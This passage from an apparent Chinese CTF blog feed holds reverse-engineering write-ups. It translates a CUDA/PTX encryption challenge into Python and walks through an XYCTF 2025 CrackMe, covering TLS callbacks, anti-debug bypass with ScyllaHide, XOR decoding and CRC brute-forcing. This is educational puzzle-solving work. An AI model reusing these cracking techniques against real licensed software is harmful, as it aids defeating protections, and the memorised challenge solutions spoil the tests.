class="hljs-number">4</span>:idx+<span class="hljs-number">8</span>], <span class="hljs-string">&#x27;little&#x27;</span>)<br>        s = <span class="hljs-number">1786956040</span><br>        <br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3238567</span>):<br>            <span class="hljs-comment"># 更新v1</span><br>            t1 = ((v0 &lt;&lt; <span class="hljs-number">4</span>) + <span class="hljs-number">1386807340</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            t2 = ((v0 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">2007053320</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            t3 = (t1 ^ t2) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            v1 = (v1 + (t3 ^ (v0 + s))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            <br>            <span class="hljs-comment"># 更新v0</span><br>            t1 = ((v1 &lt;&lt; <span class="hljs-number">4</span>) + <span class="hljs-number">621668851</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            t2 = ((v1 &gt;&gt; <span class="hljs-number">5</span>) - <span class="hljs-number">862448841</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            t3 = (t1 ^ (s + v1)) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            v0 = (v0 - (t3 ^ t2)) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            <br>            <span class="hljs-comment"># 更新常量</span><br>            s = (s - <span class="hljs-number">1708609273</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        <br>        <span class="hljs-comment"># 写回结果</span><br>        buffer[idx:idx+<span class="hljs-number">4</span>] = v0.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br>        buffer[idx+<span class="hljs-number">4</span>:idx+<span class="hljs-number">8</span>] = v1.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br></code></pre></td></tr></table></figure><p>3.二次异或：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">and</span>.b<span class="hljs-number">16</span> <span class="hljs-variable">%rs16</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rs9</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rs8</span><span class="hljs-comment">;  // bid &amp; tid</span><br><span class="hljs-keyword">xor</span>.b<span class="hljs-number">16</span> <span class="hljs-variable">%rs18</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rs17</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rs16</span><span class="hljs-comment">;  // buffer ^= (bid &amp; tid)</span><br>st.<span class="hljs-keyword">global</span>.u<span class="hljs-number">8</span> [<span class="hljs-variable">%rd3</span>]<span class="hljs-punctuation">,</span> <span class="hljs-variable">%rs18</span><span class="hljs-comment">;</span><br>bar.sync <span class="hljs-number">0</span><span class="hljs-comment">;  // 同步</span><br></code></pre></td></tr></table></figure><p>推导：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> tid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    idx = bid * <span class="hljs-number">256</span> + tid<br>    buffer[idx] ^= bid &amp; tid<br></code></pre></td></tr></table></figure><p>4.T 盒&#x2F;S 盒 累加</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs llvm">ld.const.u<span class="hljs-number">8</span> <span class="hljs-variable">%rs31</span><span class="hljs-punctuation">,</span> [<span class="hljs-variable">%rd9</span>]<span class="hljs-comment">;  // sbox_val = sbox[tid]</span><br>mov.u<span class="hljs-number">16</span> <span class="hljs-variable">%rs32</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-comment">;           // 累加器初始化</span><br><br>$L__BB<span class="hljs-number">2</span>_<span class="hljs-number">5</span>:  // 累加循环 (<span class="hljs-number">256</span>次)<br>ld.const.u<span class="hljs-number">8</span> <span class="hljs-variable">%rs19</span><span class="hljs-punctuation">,</span> [<span class="hljs-variable">%rd15</span>]<span class="hljs-comment">;  // tbox[sbox_val]</span><br>ld.<span class="hljs-keyword">global</span>.u<span class="hljs-number">8</span> <span class="hljs-variable">%rs20</span><span class="hljs-punctuation">,</span> [<span class="hljs-variable">%rd11</span>]<span class="hljs-comment">; // 加载输入字节</span><br><span class="hljs-keyword">mul</span>.lo.s<span class="hljs-number">16</span> <span class="hljs-variable">%rs21</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rs19</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rs20</span><span class="hljs-comment">;  // tbox[sbox] * buffer[i]</span><br><span class="hljs-keyword">add</span>.s<span class="hljs-number">16</span> <span class="hljs-variable">%rs32</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rs21</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rs32</span><span class="hljs-comment">;     // 累加</span><br><br>// 更新S盒值<br><span class="hljs-keyword">mul</span>.lo.s<span class="hljs-number">16</span> <span class="hljs-variable">%rs22</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rs31</span><span class="hljs-punctuation">,</span> <span class="hljs-number">5</span><span class="hljs-comment">;</span><br><span class="hljs-keyword">add</span>.s<span class="hljs-number">16</span> <span class="hljs-variable">%rs31</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rs22</span><span class="hljs-punctuation">,</span> <span class="hljs-number">17</span><span class="hljs-comment">;   // sbox_val = sbox_val * 5 + 17</span><br></code></pre></td></tr></table></figure><p>推导：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> bid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    <span class="hljs-keyword">for</span> tid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        s_val = cuda_sbox[tid]<br>        accum = <span class="hljs-number">0</span><br>        <br>        <span class="hljs-comment"># 处理整个块</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            idx = bid * <span class="hljs-number">256</span> + i<br>            accum += cuda_tbox[s_val] * buffer[idx]<br>            s_val = (s_val * <span class="hljs-number">5</span> + <span class="hljs-number">17</span>) &amp; <span class="hljs-number">0xFF</span><br>        <br>        <span class="hljs-comment"># 保留16位结果</span><br>        accum &amp;= <span class="hljs-number">0xFFFF</span><br></code></pre></td></tr></table></figure><p>5.混淆循环</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mel">$L__BB2_7:  <span class="hljs-comment">// 混淆循环 (4,137,815轮)</span><br><span class="hljs-comment">// 循环左移3位</span><br>shl.b16 %rs23, %rs32, <span class="hljs-number">3</span>;     <span class="hljs-comment">// 低13位左移3位</span><br>and.b16 %rs24, %rs32, <span class="hljs-number">224</span>;   <span class="hljs-comment">// 0xE0 (高3位)</span><br>shr.u16 %rs25, %rs24, <span class="hljs-number">5</span>;     <span class="hljs-comment">// 高3位右移5位</span><br>or.b16 %rs26, %rs25, %rs23;  <span class="hljs-comment">// 组合 → 循环左移3位</span><br><br><span class="hljs-comment">// 非线性变换</span><br>mad.lo.s32 %r43, %r42, <span class="hljs-number">13</span>, %r18;  <span class="hljs-comment">// rotated*13 + (bid^tid)</span><br>ld.const.u8 %rs28, [%rd18];  <span class="hljs-comment">// tbox[i &amp; 0xFF]</span><br>xor.b16 %rs29, %rs28, %rs27; <span class="hljs-comment">// tbox[i] ^ LSB(t)</span><br>ld.const.u8 %rs32, [%rd22];  <span class="hljs-comment">// sbox[result] → 更新累加器</span><br></code></pre></td></tr></table></figure><p>推导：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> bid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    <span class="hljs-keyword">for</span> tid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        mixer = bid ^ tid<br>        <br>        <span class="hljs-comment"># 混淆循环 (从8开始)</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>, <span class="hljs-number">4137823</span>):<br>            <span class="hljs-comment"># 16位循环左移3位</span><br>            rotated = ((accum &lt;&lt; <span class="hljs-number">3</span>) | (accum &gt;&gt; <span class="hljs-number">13</span>)) &amp; <span class="hljs-number">0xFFFF</span><br>            <br>            <span class="hljs-comment"># 乘加运算</span><br>            t_val = rotated * <span class="hljs-number">13</span> + mixer<br>            <br>            <span class="hljs-comment"># T盒/S盒变换</span><br>            tbox_val = cuda_tbox[i &amp; <span class="hljs-number">0xFF</span>]<br>            s_idx = tbox_val ^ (t_val &amp; <span class="hljs-number">0xFF</span>)<br>            accum = cuda_sbox[s_idx]<br>        <br>        output[bid * <span class="hljs-number">256</span> + tid] = accum &amp; <span class="hljs-number">0xFF</span><br></code></pre></td></tr></table></figure><p>完整加密过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">layer1</span>(<span class="hljs-params">input_data</span>):<br>    block_dim = <span class="hljs-number">256</span><br>    output = [<span class="hljs-number">0</span>] * (<span class="hljs-number">256</span> * <span class="hljs-number">256</span>)<br>    <br>    <span class="hljs-keyword">for</span> bid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">241</span>):<br>        <span class="hljs-keyword">for</span> tid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">241</span>):<br>            total = <span class="hljs-number">0.0</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>                motion_idx = <span class="hljs-number">240</span> - i * <span class="hljs-number">16</span><br>                <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>                    input_idx = (bid + i) * block_dim + (tid + j)<br>                    total += cuda_motion[motion_idx + j] * input_data[input_idx]<br>            <br>            output[bid * block_dim + tid] = <span class="hljs-built_in">int</span>(total) &amp; <span class="hljs-number">0xFF</span><br>    <br>    <span class="hljs-keyword">return</span> output<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">layer2</span>(<span class="hljs-params">input_data</span>):<br>    block_dim = <span class="hljs-number">256</span><br>    output = [<span class="hljs-number">0</span>] * (<span class="hljs-number">256</span> * <span class="hljs-number">256</span>)<br>    <br>    <span class="hljs-keyword">for</span> bid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-keyword">for</span> tid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            input_idx = bid * block_dim + tid<br>            new_idx = block_dim * cuda_sbox[tid] + cuda_sbox[bid]<br>            output[new_idx] = input_data[input_idx]<br>    <br>    <span class="hljs-keyword">return</span> output<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">layer3</span>(<span class="hljs-params">input_data</span>):<br>    block_dim = <span class="hljs-number">256</span><br>    buffer = <span class="hljs-built_in">bytearray</span>(input_data)  <br>    output = [<span class="hljs-number">0</span>] * (<span class="hljs-number">256</span> * <span class="hljs-number">256</span>)<br>    <br><br>    <span class="hljs-keyword">for</span> bid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-keyword">for</span> tid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            idx = bid * block_dim + tid<br>            buffer[idx] ^= bid | tid<br>    <br><br>    <span class="hljs-keyword">for</span> bid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-keyword">for</span> tid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>, <span class="hljs-number">8</span>):<br>            idx = bid * block_dim + tid<br><br>            v0 = <span class="hljs-built_in">int</span>.from_bytes(buffer[idx:idx+<span class="hljs-number">4</span>], <span class="hljs-string">&#x27;little&#x27;</span>)<br>            v1 = <span class="hljs-built_in">int</span>.from_bytes(buffer[idx+<span class="hljs-number">4</span>:idx+<span class="hljs-number">8</span>], <span class="hljs-string">&#x27;little&#x27;</span>)<br>            s = <span class="hljs-number">1786956040</span><br>            <br>            <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3238567</span>):<br><br>                t1 = ((v0 &lt;&lt; <span class="hljs-number">4</span>) + <span class="hljs-number">1386807340</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>                t2 = ((v0 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">2007053320</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>                t3 = (t1 ^ t2) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>                v1 = (v1 + (t3 ^ (v0 + s))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>                <br>                t1 = ((v1 &lt;&lt; <span class="hljs-number">4</span>) + <span class="hljs-number">621668851</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>                t2 = ((v1 &gt;&gt; <span class="hljs-number">5</span>) - <span class="hljs-number">862448841</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>                t3 = (t1 ^ (s + v1)) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>                v0 = (v0 - (t3 ^ t2)) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>                <br>                s = (s - <span class="hljs-number">1708609273</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            <br>            buffer[idx:idx+<span class="hljs-number">4</span>] = v0.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br>            buffer[idx+<span class="hljs-number">4</span>:idx+<span class="hljs-number">8</span>] = v1.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br>    <br>    <span class="hljs-keyword">for</span> bid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-keyword">for</span> tid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            idx = bid * block_dim + tid<br>            buffer[idx] ^= bid &amp; tid<br>    <br>    <span class="hljs-keyword">for</span> bid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-keyword">for</span> tid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            s_val = cuda_sbox[tid]<br>            accum = <span class="hljs-number">0</span><br>            <br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>                idx = bid * block_dim + i<br>                accum = (accum + cuda_tbox[s_val] * buffer[idx]) &amp; <span class="hljs-number">0xFFFF</span><br>                s_val = (s_val * <span class="hljs-number">5</span> + <span class="hljs-number">17</span>) &amp; <span class="hljs-number">0xFF</span><br>    <br>    <span class="hljs-keyword">for</span> bid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-keyword">for</span> tid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            mixer = bid ^ tid<br>            <br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>, <span class="hljs-number">4137823</span>):<br>                rotated = ((accum &lt;&lt; <span class="hljs-number">3</span>) | (accum &gt;&gt; <span class="hljs-number">13</span>)) &amp; <span class="hljs-number">0xFFFF</span><br>                <br>                t_val = rotated * <span class="hljs-number">13</span> + mixer<br>                <br>                tbox_val = cuda_tbox[i &amp; <span class="hljs-number">0xFF</span>]<br>                s_idx = tbox_val ^ (t_val &amp; <span class="hljs-number">0xFF</span>)<br>                accum = cuda_sbox[s_idx]<br><br>            output[bid * block_dim + tid] = accum &amp; <span class="hljs-number">0xFF</span><br>    <br>    <span class="hljs-keyword">return</span> output<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_data</span>(<span class="hljs-params">input_data</span>):<br>    l1 = layer1(input_data)<br>    l2 = layer2(l1)<br>    l3 = layer3(l2)<br>    <span class="hljs-keyword">return</span> l3<br></code></pre></td></tr></table></figure><p>接下来就是从 Layer3 开始逐层倒着解密<br>详细参考<br><a href="https://astralprisma.github.io/2025/04/27/actf_25/">棱晶 の wp</a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>cuda</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XYCTF2025 Reverse 方向复现</title>
    <link href="/2025/07/20/XYCTF2025/"/>
    <url>/2025/07/20/XYCTF2025/</url>
    
    <content type="html"><![CDATA[<h3 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h3><p>ida 打开看到 WinMain 函数，同时注意到有一个 TlsCallback_0 函数</p><blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">&gt;VOID NTAPI <span class="hljs-title function_">TlsCallback</span><span class="hljs-params">(PVOID DllHandle, DWORD dwReason, PVOID Reserved)</span> &#123;<br><span class="hljs-comment">//DllHandle:对于 exe 是进程句柄，对于 dll 是模块句柄；dwReason:回调原因；Reserved:保留参数，一般用不到</span><br>   <span class="hljs-keyword">if</span> (dwReason == DLL_PROCESS_ATTACH) &#123;<br>       MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;TlsCallback Triggered!&quot;</span>, <span class="hljs-string">&quot;Info&quot;</span>, <span class="hljs-number">0</span>);<br>   &#125;<br>&gt;&#125;<br></code></pre></td></tr></table></figure></blockquote><!-- dwReason：宏常量              值   说明DLL_PROCESS_ATTACH1当前进程启动时调用DLL_THREAD_ATTACH2当前进程中新建线程时调用DLL_THREAD_DETACH3当前进程中的线程退出时调用DLL_PROCESS_DETACH0当前进程结束时调用 --><p>点进 WinMain，有反调试，先打断点运行起来用 ScyllaHide 去一下反调；很多传入了多个参数的 sub 函数点进去看发现没有什么重要信息，找到 sub_xxxAC00(v39),点进去后同样注意到 v6 &#x3D; sub_7FF7AD959470;<br><img src="/../images/XYCTF2025/cr2.png"><br>sub_xxx8770 里面像是一个消息处理器，根据不同的参数值分发不同的处理逻辑<br>而 Tlscallback 这边，进入 sub_xxx2370<br><img src="/../images/XYCTF2025/cr3.png"><br><img src="/../images/XYCTF2025/cr4.png"><br><img src="/../images/XYCTF2025/cr5.png"><br>switch 下有五个 case，分别对应不同的参数，case0 里面带点进 sub_xxxF280 挺复杂的，留到后面看，case1、case2、case3 没什么东西，case4 和 case5 有可疑的函数<br><img src="/../images/XYCTF2025/cr6.png"><br><strong>case4</strong> 的 sub_xxxD010 里面有个异或<br><img src="/../images/XYCTF2025/cr7.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">data=[<span class="hljs-number">0xDD</span>,<span class="hljs-number">0xD7</span>,<span class="hljs-number">0xDa</span>,<span class="hljs-number">0xDC</span>,<span class="hljs-number">0xC0</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>    data[i] ^= <span class="hljs-number">0xBB</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(data[i]), end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>解出来是 <code>flag&#123;</code>,由此可知此处是校验 flag 的格式<br><strong>case5</strong> 的 sub_xxxC850 里看到了 <strong>CRC 校验</strong><br><img src="/../images/XYCTF2025/cr8.png"><br>爆破出输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_crc32_table</span>():<br>    table = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        x = i<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            <span class="hljs-keyword">if</span> x &amp; <span class="hljs-number">1</span>:<br>                x = (x &gt;&gt; <span class="hljs-number">1</span>) ^ <span class="hljs-number">0xEDB88321</span><br>            <span class="hljs-keyword">else</span>:<br>                x = x &gt;&gt; <span class="hljs-number">1</span><br>        table.append(x)<br>    <span class="hljs-keyword">return</span> table<br><br><br>data = [<br>    <span class="hljs-number">0x46A95BAD</span>, <span class="hljs-number">0x1CAC84B6</span>, <span class="hljs-number">0xA67CB2B2</span>, <br>    <span class="hljs-number">0x32188937</span>, <span class="hljs-number">0x4872D39F</span>, <span class="hljs-number">0xF2A2E59B</span>, <span class="hljs-number">0x011B94D2</span><br>]<br><br>crc_table = generate_crc32_table()<br><br>result_bytes = []<br><span class="hljs-keyword">for</span> val <span class="hljs-keyword">in</span> data:<br>    <br>    target_crc = (~(val ^ <span class="hljs-number">0xB0E0E879</span>)) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>       <br>    found_idx = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> idx, crc_val <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(crc_table):<br>        <span class="hljs-keyword">if</span> crc_val == target_crc:<br>            found_idx = idx<br>            <span class="hljs-keyword">break</span><br>    <br>    <span class="hljs-keyword">if</span> found_idx <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:    <br>        input_byte = found_idx ^ <span class="hljs-number">0x79</span><br>        result_bytes.append(input_byte)<br>    <span class="hljs-keyword">else</span>:<br>        result_bytes.append(<span class="hljs-number">0xFF</span>)  <span class="hljs-comment"># 未找到标记</span><br><br>printable_bytes = [b <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> result_bytes <span class="hljs-keyword">if</span> <span class="hljs-number">32</span> &lt;= b &lt;= <span class="hljs-number">126</span>]<br>flag_part = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(b) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> printable_bytes)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot; <span class="hljs-subst">&#123;flag_part&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot; <span class="hljs-subst">&#123;result_bytes&#125;</span>&quot;</span>)<br><span class="hljs-comment">#  moshui_</span><br><span class="hljs-comment">#  [109, 111, 115, 104, 117, 105, 95]</span><br></code></pre></td></tr></table></figure><p>所以这里得到部分flag <code>moshui_</code><br><strong>case0</strong> 的 sub_xxxF280<br><img src="/../images/XYCTF2025/cr11.png"><br>里面依旧有 crc ，不过这里的 crc 不是进行校验，而是使用输入的前 5 个字节(“flag{“)加上 {} 内部的前 7 个字节(v7 数组里面)生成了两个四字节的密钥(v6[0]和v6[2]),再加上另外连个直接赋值的即可得到完整密钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_crc32_table</span>():<br>    table = []<br>    